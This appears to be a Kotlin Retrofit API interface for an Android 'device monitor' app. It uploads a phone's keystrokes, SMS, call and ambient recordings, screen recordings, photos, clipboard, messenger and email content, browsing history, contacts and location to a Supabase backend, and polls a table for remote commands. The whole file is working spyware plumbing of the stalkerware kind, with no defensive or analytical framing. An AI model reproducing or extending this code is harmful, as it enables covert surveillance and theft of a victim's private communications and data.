package com.devicemonitor.data.api

import com.devicemonitor.data.models.*
import retrofit2.Response
import retrofit2.http.*

interface SupabaseApi {

    @POST("devices")
    suspend fun insertDevice(@Body device: Device): Response<Unit>

    @GET("devices")
    suspend fun getDevice(
        @Query("device_token") deviceToken: String,
        @Query("select") select: String = "*"
    ): Response<List<Device>>

    @PATCH("devices")
    suspend fun updateDevice(
        @Query("id") id: String,
        @Body updates: Map<String, String>
    ): Response<Unit>

    @POST("locations")
    suspend fun insertLocation(@Body location: LocationEntry): Response<Unit>

    @POST("call_logs")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertCallLogs(@Body callLogs: List<CallLogEntry>): Response<Unit>

    @POST("sms")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertSmsList(@Body smsList: List<SmsEntry>): Response<Unit>

    @POST("messenger_messages")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertMessengerMessage(@Body message: MessengerMessage): Response<Unit>

    @POST("app_usage")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertAppUsageList(@Body usage: List<AppUsage>): Response<Unit>

    @POST("network_info")
    suspend fun insertNetworkInfo(@Body networkInfo: NetworkInfo): Response<Unit>

    @POST("device_info")
    suspend fun insertDeviceInfo(@Body deviceInfo: DeviceInfo): Response<Unit>

    @POST("clipboard_entries")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertClipboardEntry(@Body clipboardEntry: ClipboardEntry): Response<Unit>

    @POST("web_history")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertWebHistory(@Body webHistory: WebHistory): Response<Unit>

    @POST("keystrokes")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertKeystroke(@Body keystroke: Keystroke): Response<Unit>

    @POST("screenshots")
    suspend fun insertScreenshot(@Body screenshot: Screenshot): Response<Unit>

    @POST("photos")
    suspend fun insertPhoto(@Body photo: Photo): Response<Unit>

    @POST("ambient_recordings")
    suspend fun insertAmbientRecording(@Body recording: AmbientRecording): Response<Unit>

    @POST("screen_recordings")
    suspend fun insertScreenRecording(@Body recording: ScreenRecording): Response<Unit>

    @POST("risk_alerts")
    suspend fun insertRiskAlert(@Body alert: RiskAlert): Response<Unit>

    @POST("contacts")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertContacts(@Body contacts: List<ContactEntry>): Response<Unit>

    @POST("call_recordings")
    suspend fun insertCallRecording(@Body recording: CallRecording): Response<Unit>

    @POST("sim_changes")
    suspend fun insertSimChange(@Body simChange: SimChange): Response<Unit>

    @POST("file_entries")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertFileEntries(@Body files: List<FileEntry>): Response<Unit>

    @GET("blocked_apps")
    suspend fun getBlockedApps(
        @Query("device_id") deviceId: String,
        @Query("select") select: String = "*"
    ): Response<List<BlockedApp>>

    @POST("email_entries")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertEmailEntry(@Body entry: EmailEntry): Response<Unit>

    @POST("calendar_events")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertCalendarEvent(@Body event: CalendarEvent): Response<Unit>

    @POST("wifi_history")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertWifiHistory(@Body history: WifiHistory): Response<Unit>

    @POST("social_media_media")
    suspend fun insertSocialMediaMedia(@Body media: SocialMediaMedia): Response<Unit>

    @POST("installed_apps")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertInstalledApps(@Body apps: List<InstalledApp>): Response<Unit>

    @POST("sensor_data")
    suspend fun insertSensorData(@Body data: SensorData): Response<Unit>

    @POST("app_screen_context")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertAppScreenContext(@Body context: AppScreenContext): Response<Unit>

    @POST("app_traffic")
    @Headers("Prefer: resolution=merge-duplicates")
    suspend fun insertAppTraffic(@Body traffic: AppTraffic): Response<Unit>

    @GET("commands")
    suspend fun getPendingCommands(
        @Query("device_id") deviceId: String,
        @Query("status") status: String = "eq.pending",
        @Query("order") order: String = "created_at.asc"
    ): Response<List<RemoteCommand>>

    @PATCH("commands")
    suspend fun updateCommandStatus(
        @Query("id") id: String,
        @Body updates: Map<String, String?>
    ): Response<Unit>
}
